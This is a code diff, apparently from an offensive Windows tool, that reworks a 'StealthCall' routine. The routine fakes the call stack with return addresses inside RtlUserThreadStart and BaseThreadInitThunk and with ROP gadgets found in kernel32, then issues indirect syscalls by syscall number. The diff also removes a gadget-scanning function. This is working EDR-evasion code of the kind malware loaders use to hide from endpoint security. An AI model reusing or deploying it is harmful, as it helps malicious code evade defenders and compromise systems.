@@ -27,42 +27,6 @@ PVOID FindJMPGadget(HMODULE hModule) {
     return NULL;
 }
 
-PVOID FindAddRspRetGadget(HMODULE hModule, DWORD minRequiredSize, DWORD* pFoundSize) {
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
-    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((PBYTE)hModule + dos->e_lfanew);
-
-    DWORD textSize = nt->OptionalHeader.SizeOfCode;
-    PBYTE text = (PBYTE)hModule + nt->OptionalHeader.BaseOfCode;
-
-    for (DWORD i = 0; i < textSize - 8; i++) {
-        DWORD currentSize = 0;
-        
-        // Match: 48 83 c4 <imm8> c3 (add rsp, imm8; ret)
-        if (text[i] == 0x48 && text[i+1] == 0x83 && text[i+2] == 0xC4 && text[i+4] == 0xC3) {
-            currentSize = text[i+3];
-        }
-        // Match: 48 81 c4 <imm32> c3 (add rsp, imm32; ret)
-        else if (text[i] == 0x48 && text[i+1] == 0x81 && text[i+2] == 0xC4 && text[i+7] == 0xC3) {
-            currentSize = *(DWORD*)&text[i+3];
-        }
-
-        // We need X to be large enough to jump over our shadow space and args
-        if (currentSize >= minRequiredSize && (currentSize % 8 == 0)) {
-            PVOID gadget = &text[i];
-            
-            // CRITICAL: Ensure the gadget has UNWIND_INFO metadata
-            DWORD64 ImageBase = 0;
-            PRUNTIME_FUNCTION pRuntimeFunc = RtlLookupFunctionEntry((DWORD64)gadget, &ImageBase, NULL);
-            
-            if (pRuntimeFunc != NULL) {
-                *pFoundSize = currentSize;
-                return gadget;
-            }
-        }
-    }
-    return NULL;
-}
-
 DWORD getStackFrameSize(PVOID funcPTR, HMODULE modulePTR) {
     UINT64 pExceptionDirectory;
 	DWORD dwRuntimeFunctionCount;
@@ -289,6 +253,9 @@ DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, DWORD *
 ULONG StealthCall(DWORD funcSSN, PVOID pTarget, DWORD dwNumberOfArgs, ...){
     va_list additionalArgs;
 
+    PSTACK_CONFIG stackConfig = malloc(sizeof(STACK_CONFIG));
+    memset(stackConfig, 0, sizeof(STACK_CONFIG));
+
     PVOID pGadget, pRtlUserThreadStart, pBaseThreadInitThunk;
 	HMODULE pNtdll, pKernel32;
 
@@ -300,49 +267,27 @@ ULONG StealthCall(DWORD funcSSN, PVOID pTarget, DWORD dwNumberOfArgs, ...){
 
     //printf("[*] Got RtlUserThreadStart from ntdll.dll @ 0x%p\n", pRtlUserThreadStart);
     //printf("[*] Got BaseThreadInitThunk from kernel32.dll @ 0x%p\n", pBaseThreadInitThunk);
-    PVOID pJmpRbxGadget = FindJMPGadget(pKernel32);
+    pGadget = FindJMPGadget(pKernel32);
 
-    //The Size needed for the AddRsp gadget is the size of the shadow space (0x20) + the size of the arguments we push (8 bytes per arg after the 4th)
-    // like that itcan be catched into the right place in the stack and we can control the arguments of our call
-    DWORD minSize = 0x20; // Shadow Space
-    if (dwNumberOfArgs > 4) {
-        minSize += (dwNumberOfArgs - 4) * 8;
-    }
-    minSize += 0x10; // Just to be safe and have some room for error (in case our stack size calculation is a bit off)
+    stackConfig->pRopGadget             = pGadget;
+    stackConfig->pSpoofed1_ret          = (PVOID)((UINT64)pRtlUserThreadStart + 0x31);   //Getting a random point in the function to fake the ret of the spoofed frame
+    stackConfig->Spoofed1StackSize      = getStackFrameSize(pRtlUserThreadStart, pNtdll);
+    stackConfig->pSpoofed2_ret          = (PVOID)((UINT64)pBaseThreadInitThunk + 0x20); //Same random point
+    stackConfig->Spoofed2StackSize      = getStackFrameSize(pBaseThreadInitThunk, pKernel32);
+    stackConfig->SpoofedGadgetSize      = getStackFrameSize(pGadget, pKernel32);
+    stackConfig->ssn                    = funcSSN;
 
-    //printf("[*] Searching for AddRsp; Ret gadget in kernel32.dll with minimum size of 0x%x\n", minSize);
-    DWORD addRspSize = 0;
-    PVOID pAddRspRetGadget = FindAddRspRetGadget(pKernel32, minSize, &addRspSize);
+    stackConfig->dwNumberOfArgs         = (dwNumberOfArgs > 4) ? dwNumberOfArgs : 4;
+    stackConfig->pTarget = pTarget;
+    //printf("[*] stackConfig->pTarget set to 0x%p\n", stackConfig->pTarget);
 
-    // Allocate STACK_CONFIG
-    HANDLE hHeap = GetProcessHeap();
-    PSTACK_CONFIG stackConfig = (PSTACK_CONFIG)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(STACK_CONFIG));
-    if (!stackConfig) return 0;
-
-    // The ASM payload always reads at least 4 QWORDs for RCX, RDX, R8, R9.
-    // We must ensure the allocation is at least 32 bytes (4 args) to prevent Access Violations.
-    DWORD argsToAllocate = (dwNumberOfArgs > 4) ? dwNumberOfArgs : 4;
-    stackConfig->pArgs = (UINT64)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, argsToAllocate * 8);
-    if (!stackConfig->pArgs) {
-        HeapFree(hHeap, 0, stackConfig);
-        return 0;
-    }
-    stackConfig->pSpoofed1_ret     = (UINT64)pRtlUserThreadStart + 0x31;
-    stackConfig->Spoofed1StackSize = getStackFrameSize(pRtlUserThreadStart, pNtdll);
-    stackConfig->pSpoofed2_ret     = (UINT64)pBaseThreadInitThunk + 0x20;
-    stackConfig->Spoofed2StackSize = getStackFrameSize(pBaseThreadInitThunk, pKernel32);
-    
-    stackConfig->pJmpRbxGadget     = (UINT64)pJmpRbxGadget;
-    stackConfig->pAddRspRetGadget  = (UINT64)pAddRspRetGadget;
-    stackConfig->AddRspSize        = addRspSize;
-    stackConfig->ssn               = funcSSN;
-    stackConfig->pTarget           = (UINT64)pTarget;
-    stackConfig->dwNumberOfArgs    = dwNumberOfArgs;
-
+    stackConfig->pArgs = malloc(8 * stackConfig->dwNumberOfArgs); //allocate 8 bytes time number of args
+    //printf("[*] Allocating %d bytes for %d args\n", (8 * stackConfig->dwNumberOfArgs), stackConfig->dwNumberOfArgs);
+    memset(stackConfig->pArgs, 0, 8 * stackConfig->dwNumberOfArgs);
     
     //Say that there is more argument to our function w/ DWORD dwNumberOfArgs
     va_start(additionalArgs, dwNumberOfArgs); //make additianlArgs point to the stack after DWORD dwNumberOfArgs and can be pop
-    for (INT i = 0; i < dwNumberOfArgs; i++){
+    for (int i = 0; i < dwNumberOfArgs; i++){
         UINT64 argValue = va_arg(additionalArgs, UINT64);
         ((PUINT64)stackConfig->pArgs)[i] = argValue;
         //printf("\t[Arg %d] Value: 0x%016llX\n", i, (unsigned long long)argValue);
@@ -352,7 +297,8 @@ ULONG StealthCall(DWORD funcSSN, PVOID pTarget, DWORD dwNumberOfArgs, ...){
     //printf("[*] Performing the call spoofed !\n");    
     ULONG status = (ULONG)(ULONG_PTR)SpoofCall(stackConfig);
 
-    HeapFree(hHeap, 0, (PVOID)stackConfig->pArgs);
-    HeapFree(hHeap, 0, stackConfig);
+    free(stackConfig->pArgs);
+    free(stackConfig);
     return status;
+    
 }
